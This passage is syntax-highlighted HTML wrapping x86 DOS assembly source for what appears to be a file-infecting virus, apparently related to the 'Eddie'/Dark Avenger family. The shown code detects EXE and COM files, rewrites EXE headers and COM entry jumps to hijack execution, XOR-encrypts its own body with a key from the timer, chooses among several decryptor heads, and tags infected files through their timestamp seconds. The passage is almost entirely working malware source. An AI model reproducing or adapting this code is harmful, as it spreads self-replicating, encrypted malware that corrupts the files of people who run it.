                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_first_3</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_calc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_first_3</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_calc</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">f_size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">repl0</span><span class="sc4">[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_first_3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_first_3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rpl1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rpl2</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">j_encrypt</span><span class="sc0">

</span><span class="sc5">oldl0</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oldl2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">exe_calc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oldl0</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oldl2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_cpt1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_cpt2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ideal</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;                mov     ax,oldl0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">marker</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">j_encrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">                         </span><span class="sc1">;encrypt &amp; write</span><span class="sc0">
                </span><span class="sc6">sahf</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_write_1st</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">marker</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_jump</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">repl0</span><span class="sc0">                 </span><span class="sc1">;write "CALL" head</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">alldone</span><span class="sc0">

</span><span class="sc5">exe_jump</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ofs_first_3</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">alldone</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_time</span><span class="sc4">],</span><span class="sc2">255</span><span class="sc4">-</span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ofs_time</span><span class="sc4">],</span><span class="sc5">sec</span><span class="sc0">
</span><span class="sc5">no_write_1st</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sahf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_call0</span><span class="sc1">;                ret</span><span class="sc0">

</span><span class="sc1">;db 'Blessed is the one who expects nothing, for he shall not be dissapointed$'</span><span class="sc0">

</span><span class="sc1">;≥›€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€                             Encrypt &amp; Write                            €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€ﬁ≥</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;Save DS &amp; ES</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;DS = ES = CS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;Save BX</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_encryption_head</span><span class="sc0">  </span><span class="sc1">;Choose encryption head</span><span class="sc0">
</span><span class="sc5">get_enc_key</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_enc_key</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;BH = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc5">encr_h_xor</span><span class="sc0">           </span><span class="sc1">;BL = internal XOR-ofs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">;b [Si+Bx] = Encr. key</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc5">encr_h_cx</span><span class="sc0">            </span><span class="sc1">;BL = internal CX-ofs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc4">-</span><span class="sc2">10Ah</span><span class="sc0"> </span><span class="sc1">;w [Si+Bx] = Encr.length</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;DI = AX</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2048</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'ê'</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">encr_h_len</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ideal</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">append</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">total</span><span class="sc4">],</span><span class="sc2">1F0Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write to handle</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;restore handle number</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">;CH = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">encr_h_len</span><span class="sc0">           </span><span class="sc1">;CL = Length of de-garbler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">;DX = Offset to de-garbler-head</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">;Call DOS</span><span class="sc0">

                </span><span class="sc6">lahf</span><span class="sc0">                            </span><span class="sc1">;AH = FLAGS</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;All bytes written?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">success</span><span class="sc0">                 </span><span class="sc1">;yes, then degarbler written</span><span class="sc0">

                </span><span class="sc6">sahf</span><span class="sc0">                            </span><span class="sc1">;FLAGS = AH</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">success</span><span class="sc0">                 </span><span class="sc1">;If no error, then...</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">;...set CY, and...</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;...return.</span><span class="sc0">
</span><span class="sc5">success</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;DI = AX</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">;Exchange AL with AH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">;SourceIndex = 100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0">         </span><span class="sc1">;DI = End-Of-Code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc4">-</span><span class="sc2">11Fh</span><span class="sc0">    </span><span class="sc1">;Encryption length</span><span class="sc0">
</span><span class="sc5">encrypt_l</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;al = [SI], si: +1</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">;garble byte</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;[DI] = al, di: +1</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_l</span><span class="sc0">               </span><span class="sc1">;and again....</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">encr_h_len</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">append</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">                   </span><span class="sc1">;the last bytes remain</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;degarbeled</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write to handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">;CX = Bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0">         </span><span class="sc1">;DX = Garbeled code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">;Call Dos</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">lahf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;all bytes written?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">encr_b1</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">lahf</span><span class="sc0">
</span><span class="sc5">encr_b1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;restore ES &amp; DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">sahf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;return</span><span class="sc0">


</span><span class="sc1">;≥›€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€  Choose which encryption-head to use with this generation, and store   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€  the pointer and the two internal offsets for later use.               €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€ﬁ≥</span><span class="sc0">
</span><span class="sc5">choose_encryption_head</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">                  </span><span class="sc1">;get date</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">;using DOS</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">;clear bits 9-16 of AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;copy AX into CX</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_data</span><span class="sc0">      </span><span class="sc1">;point SI to Enc_Data</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;clear direction flag</span><span class="sc0">

</span><span class="sc5">lete_etter_enc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;al=[si] , si=si+1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;si = si + ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;si = si + 1</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;si = si + 1</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">lete_etter_enc</span><span class="sc0">          </span><span class="sc1">;continue the searching ...</span><span class="sc0">

</span><span class="sc5">funnet_riktige</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encr_h_len</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;load the CX offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encr_h_cx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;load the XOR offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encr_h_xor</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encr_h_ofs</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;db 'Eddie lives... Somewhere in time...'</span><span class="sc0">

</span><span class="sc5">init</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
